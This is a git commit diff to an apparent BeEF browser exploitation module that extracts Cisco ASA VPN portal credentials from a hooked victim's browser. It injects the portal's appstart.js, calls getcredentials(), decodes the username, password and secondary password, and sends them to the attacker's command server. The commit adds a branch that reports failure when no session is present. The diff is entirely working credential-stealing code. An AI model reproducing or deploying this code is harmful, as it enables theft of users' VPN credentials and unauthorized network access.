a876233579b7e24dd341f6c222459d0643aa1ba6
catatonicprime <catatonicprime@gmail.com>
2023-12-18 05:53:05 +0000

    Report failures too.

--- modules/browser/hooked_domain/cisco_asa_password_disclosure/command.js
+++ modules/browser/hooked_domain/cisco_asa_password_disclosure/command.js
@@ -11,14 +11,19 @@ beef.execute(function() {
   s = document.createElement("script");
   s.src = "/+CSCOE+/appstart.js";
   document.body.appendChild(s);
-  setTimeout(function () {
-    creds = getcredentials();
-    var result = [];
-    result.push({
-      "username": rot13(hex_2_ascii(creds.split('/')[0].split('=')[1])),
-      "password": rot13(hex_2_ascii(creds.split('/')[1].split('=')[1])),
-      "secondary_password": rot13(hex_2_ascii(creds.split('/')[5].split('=')[1]))
-    });
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=" + JSON.stringify(result));
-  }, 3000);
+
+  if (typeof getcredentials === "function") {
+    setTimeout(function () {
+      creds = getcredentials();
+      var result = [];
+      result.push({
+        "username": rot13(hex_2_ascii(creds.split('/')[0].split('=')[1])),
+        "password": rot13(hex_2_ascii(creds.split('/')[1].split('=')[1])),
+        "secondary_password": rot13(hex_2_ascii(creds.split('/')[5].split('=')[1]))
+      });
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=" + JSON.stringify(result));
+    }, 3000);
+  } else {
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "failed, most likely due to no auth");
+  }
 });
